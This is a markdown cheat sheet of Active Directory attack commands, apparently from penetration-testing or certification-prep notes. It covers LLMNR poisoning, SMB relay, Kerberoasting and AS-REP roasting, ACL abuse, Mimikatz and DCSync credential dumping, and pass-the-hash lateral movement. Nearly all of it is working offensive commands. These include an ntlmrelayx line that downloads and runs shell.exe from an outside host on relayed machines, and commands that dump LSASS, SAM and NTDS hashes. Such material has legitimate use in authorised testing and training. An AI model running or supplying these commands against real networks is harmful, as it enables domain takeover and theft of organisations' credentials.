# 06 - Active Directory Attacks & Lateral Movement

[⬅️ Back to Master Index](README.md)

---

## 📌 1. Initial Access & Traffic Poisoning

### 1. LLMNR / NBT-NS Poisoning with Responder
When Windows machines query the network for unknown hostnames, Responder intercepts broadcast requests and captures NetNTLM challenge-response hashes.

```bash
# Launch Responder on internal network interface
sudo responder -I eth0 -dwv

# Crack captured NetNTLMv2 hashes with Hashcat
hashcat -m 5600 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

### 2. SMB Relay Attacks
If target hosts have **SMB Signing disabled** (common on Windows workstations):

1. Discover hosts with SMB signing disabled:
   ```bash
   netexec smb 192.168.200.0/24 --gen-relay-list relay_targets.txt
   ```
2. Disable SMB and HTTP in `/etc/responder/Responder.conf`:
   ```ini
   SMB = Off
   HTTP = Off
   ```
3. Run Responder in the background:
   ```bash
   sudo responder -I eth0 -wd
   ```
4. Run `ntlmrelayx` to relay authentication to target hosts:
   ```bash
   # Dump local SAM hashes on relayed targets
   impacket-ntlmrelayx -tf relay_targets.txt -smb2support

   # Execute command on relayed targets
   impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell -c Invoke-WebRequest -Uri http://192.168.100.5/shell.exe -OutFile C:\shell.exe; C:\shell.exe"
   ```

---

## 🗺️ 2. Active Directory Reconnaissance

### 1. BloodHound & SharpHound
BloodHound maps relationship graphs, identifying hidden attack paths directly to Domain Admin.

#### Collect Data with SharpHound on Target:
```powershell
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename domain_bloodhound.zip
```

#### Essential BloodHound Built-in Queries to Review:
- *Find Shortest Paths to Domain Admins*
- *Find Principals with DCSync Rights*
- *Find Shortest Path from Owned Principals*
- *List all Kerberoastable Accounts*
- *Find Computers where Domain Users have Local Admin Rights*

### 2. PowerView Command Reference
```powershell
Import-Module .\PowerView.ps1

# Enumerate Domain Controllers
Get-DomainController

# Enumerate Domain Users and Description fields (often contains passwords!)
Get-DomainUser | select samaccountname,description

# Enumerate Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enumerate Computers in Domain
Get-DomainComputer | select name,operatingsystem

# Find where the current user has Local Administrator access
Find-LocalAdminAccess
```

### 3. NetExec AD Enumeration (from Kali)
```bash
# Validate credentials across all subnet domain computers
netexec smb 192.168.200.0/24 -u 'jdoe' -p 'Password123'

# Query password policy (Check lockout threshold before brute forcing!)
netexec smb 192.168.200.10 -u 'jdoe' -p 'Password123' --pass-pol

# List logged-on users across machines
netexec smb 192.168.200.0/24 -u 'jdoe' -p 'Password123' --loggedon-users
```

---

## 🎯 3. Kerberos Attacks

### 1. AS-REP Roasting (No Pre-Authentication Required)
Users configured with `DONT_REQ_PREAUTH` return an AS-REP ticket containing an encrypted timestamp that can be cracked offline without sending noise to the target host.

```bash
# Enumerate and extract AS-REP hashes with Impacket
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip 192.168.200.10 -outputfile asrep.hashes

# With valid user credentials:
GetNPUsers.py corp.local/jdoe:Password123 -dc-ip 192.168.200.10 -request -format hashcat -outputfile asrep.hashes

# Crack AS-REP hashes with Hashcat (Mode 18200)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -O
```

### 2. Kerberoasting (Service Principal Names)
Any domain authenticated user can request a Kerberos TGS ticket for accounts registered with a Service Principal Name (SPN). The ticket is encrypted with the service account's NTLM hash.

```bash
# Extract Kerberoastable TGS tickets using Impacket
GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 192.168.200.10 -request -outputfile kerb.hashes

# Execute on Windows host using Rubeus
.\Rubeus.exe kerberoast /outfile:kerb.hashes

# Crack TGS tickets with Hashcat (Mode 13100)
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt -O
```

---

## ⚔️ 4. Active Directory ACL & Domain Escalation

### 1. GenericAll / GenericWrite on User
Grants full control over another target user object:
```powershell
# Reset target user password with PowerView
Set-DomainUserPassword -Identity "targetuser" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force)
```

### 2. WriteDacl on Domain Object (Granting DCSync)
If your user has `WriteDacl` permissions over the domain root:
```powershell
# Add DCSync rights to current user (jdoe)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity "jdoe" -Rights DCSync
```

### 3. Extracting LAPS Passwords
If Local Administrator Password Solution (LAPS) is active:
```bash
# Read LAPS passwords via NetExec
netexec smb 192.168.200.10 -u 'jdoe' -p 'Password123' --laps

# Read via PowerView
Get-DomainComputer | select name,ms-mcs-admpwd
```

---

## 💰 5. Credential Extraction & DCSync

### 1. Mimikatz Credential Extraction
Requires Local Administrator or SYSTEM privileges on target:
```cmd
mimikatz.exe

# Enable debug privilege
privilege::debug

# Dump cleartext passwords and NTLM hashes from LSASS memory
sekurlsa::logonpasswords

# Dump local SAM database hashes
lsadump::sam

# Extract Domain Cached Credentials (DCC2)
lsadump::cache
```

### 2. DCSync Attack (Extracting the entire Domain NTDS.dit)
Requires Domain Admin or `DS-Replication-Get-Changes-All` rights:
```bash
# Extract NTDS.dit credentials via Impacket secretsdump
secretsdump.py corp.local/Administrator:Password123@192.168.200.10

# Pass-the-Hash DCSync execution
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 corp.local/Administrator@192.168.200.10 -just-dc-ntds
```
*Key Hashes Extracted: Administrator NTLM hash and `krbtgt` NTLM hash (used for Golden Ticket creation).*

---

## 🚀 6. Lateral Movement Techniques

### 1. Pass-the-Hash (PTH)
Execute commands on remote systems using extracted NTLM hashes without needing the plaintext password:

```bash
# Impacket PsExec (Spawns SYSTEM service shell via SMB)
impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 corp.local/Administrator@192.168.200.50

# Impacket WMIExec (Stealthier semi-interactive shell via WMI)
impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 corp.local/Administrator@192.168.200.50

# Impacket SMBExec (Execution without persistent service binary)
impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 corp.local/Administrator@192.168.200.50
```

### 2. Evil-WinRM (PowerShell Remoting - Port 5985/5986)
```bash
# Connect with plaintext password
evil-winrm -i 192.168.200.50 -u Administrator -p 'Password123'

# Connect with Pass-the-Hash (NTLM)
evil-winrm -i 192.168.200.50 -u Administrator -H fc525c9683e8fe067095ba2ddc971889

# Evil-WinRM built-in file transfers:
# (Inside session): upload /opt/payload.exe C:\Users\Public\payload.exe
# (Inside session): download C:\Users\Administrator\Desktop\flag.txt
```

### 3. Remote Desktop (RDP) with Pass-the-Hash
```bash
# Standard RDP connection with xfreerdp
xfreerdp /u:Administrator /p:'Password123' /v:192.168.200.50 /cert:ignore +clipboard /dynamic-resolution

# RDP with Pass-the-Hash (Restricted Admin Mode)
xfreerdp /u:Administrator /pth:fc525c9683e8fe067095ba2ddc971889 /v:192.168.200.50 /cert:ignore
```
